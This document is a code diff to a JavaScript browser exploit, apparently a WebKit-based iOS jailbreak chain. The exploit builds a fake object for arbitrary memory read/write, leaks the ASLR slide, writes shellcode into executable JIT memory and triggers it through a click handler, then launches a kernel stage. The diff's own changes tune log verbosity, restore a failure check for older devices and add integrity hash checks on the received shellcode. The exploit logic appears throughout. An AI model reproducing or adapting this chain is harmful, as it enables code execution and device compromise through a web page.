@@ -171,7 +171,7 @@ var pwn = function() {
     
     var fake_addr = stage1.addrof(outer) + 0x20;
     
-    if(verbosity >= VERBOSITY_DEFAULT) print('fake object is at ' + hex(fake_addr));
+    if(verbosity >= VERBOSITY_HIGH) print('fake object is at ' + hex(fake_addr));
     
     //leak the addresses of our cell
     var unboxed_addr = stage1.addrof(unboxed);
@@ -204,7 +204,7 @@ var pwn = function() {
         holder.fake[(victim_addr + 8 - leak_addr) / 8] = victim_butterfly;
     }
     
-    print('stage 1 complete, moving to stage 2.');
+    print('Stage (1/2) done.');
     
     //Alright, this is where we get full r/w to memory
     var stage2 = {
@@ -265,7 +265,7 @@ var pwn = function() {
     // Test read/write
     stage2.test();
 
-    print("Stage 2 test succeeded, continueing...");
+    if(verbosity === VERBOSITY_VERBOSE) print("Stage 2 test succeeded, continueing...");
     
     var wrapper = document.createElement('div');
     var wrapper_addr = stage2.addrof(wrapper);
@@ -273,7 +273,7 @@ var pwn = function() {
     var vtab_addr = stage2.read64(el_addr);
     
 
-    print("Lets hope our offsets are correct as we will now use them.");
+    if(verbosity >= VERBOSITY_HIGH) print("Lets hope our offsets are correct as we will now use them.");
 
     //now get the ASLR slide
     var slide = stage2.read64(vtab_addr) - _off.vtable;
@@ -304,11 +304,10 @@ var pwn = function() {
     //JIT Hardening stuff
     if (!useFastPermisionsJITCopy || jitWriteSeparateHeapsFunction) {
         // Probably an older phone, should be even easier
-        //fail(3);
-        alert("This is an older device and can use jitWriteSeparateHeapsFunction, but continueing anyway for now...");
+        fail(3);
     }
     
-    print("Setting up shellcode in memory...");
+    if(verbosity === VERBOSITY_VERBOSE) print("Setting up shellcode in memory...");
 
     //Now set up our shellcode for code execution
     var callback_vector = stage2.read64(callbacks);
@@ -320,7 +319,7 @@ var pwn = function() {
     var shellcode_dst = endOfFixedExecutableMemoryPool - 0x1000000;
 
     if (shellcode_dst < startOfFixedExecutableMemoryPool) {
-        fail(4)
+        fail(4);
     }
 
     stage2.write64(shellcode_src + 4, dlsym);
@@ -356,7 +355,7 @@ var pwn = function() {
           u32_buffer[0x2000/4 + 2*i+1] = fake_stack[i] / BASE32;
     }
     
-    print("Setting up code execution...");
+    if(verbosity >= VERBOSITY_HIGH) print("Setting up code execution...");
 
     //lets set up our code execution of the dylib payload
     stage2.write_non_zero(el_addr, [
@@ -370,9 +369,8 @@ var pwn = function() {
         0,
         buffer_addr + 0x2000, // sp
     ]);
-    print('shellcode is at ' + hex(shellcode_dst));
-    print('Next we will start empty_list, the kernel may panic, for best results close all apps except for safari before dismissing the next alert!');
-    setTimeout(function(){print("We have TFP0 probably!");}, THOUSAND*60);
+    if(verbosity >= VERBOSITY_HIGH) print('shellcode is at ' + hex(shellcode_dst));
+    if(verbosity >= VERBOSITY_DEFAULT) print('EmptyList is started, please close all background apps then dismiss this alert.');
     wrapper.addEventListener('click', function(){}); //execute the shellcode
 };
 
@@ -399,12 +397,14 @@ var wk113go = function() {
                     sha384: sha384(shellcode_data.join('')),
                     sha512: sha512(shellcode_data.join(''))
                 };
-                print("Shellcode hashes: \n" +
-                    "md5: "+shellcode_hashes.md5+"\n\n"+
-                    "sha1: "+shellcode_hashes.sha1+"\n\n"+
-                    "sha256: "+shellcode_hashes.sha256+"\n\n"+
-                    "sha384: "+shellcode_hashes.sha384+"\n\n"+
-                    "sha512: "+shellcode_hashes.sha512+"\n\n");
+                if(shellcode_hashes.md5 !== "5b8d489beb89a7515dc7fb5ee2f4092d") throw new Error('Shellcode integrity check failed.');
+                if(shellcode_hashes.sha1 !== "5d97f3843c1a3b88c7a95dae803b46e07a67d3ed") throw new Error('Shellcode integrity check failed.');
+                if(shellcode_hashes.sha256 !== "a4a3254bc86d5b2030c0637173b927a489b98d1d29fcfcc8232636eec94a2fe8") throw new Error('Shellcode integrity check failed.');
+                if(shellcode_hashes.sha384 !== "78791343c427ddd51c1bc236f77bafc4cfef04796f931d856e6652aadedb5ab54e46fe9b05e98ce7dc982eba9f1c6220") throw new Error('Shellcode integrity check failed.');
+                if(shellcode_hashes.sha512 !== "ef48614b78b42be7bedb79a7aa768eb19ad8fb05cefac2d68c8d74ab6a95d77aa1054d255294b5bf7e9ece648ac916fa8999e79aa93a707732b9850418bd0053") throw new Error('Shellcode integrity check failed.');
+                
+                print("Shellcode sha512sum: "+shellcode_hashes.sha512);
+
                 u8_buffer.set(shellcode_data, 0x4000); //basically the same as what memset() and memcpy would do in c. uint8 is a char array containing our shellcode
                 print('Received '+shellcode_length+ ' bytes of shellcode. Exploit will start now.');
                 pwn();
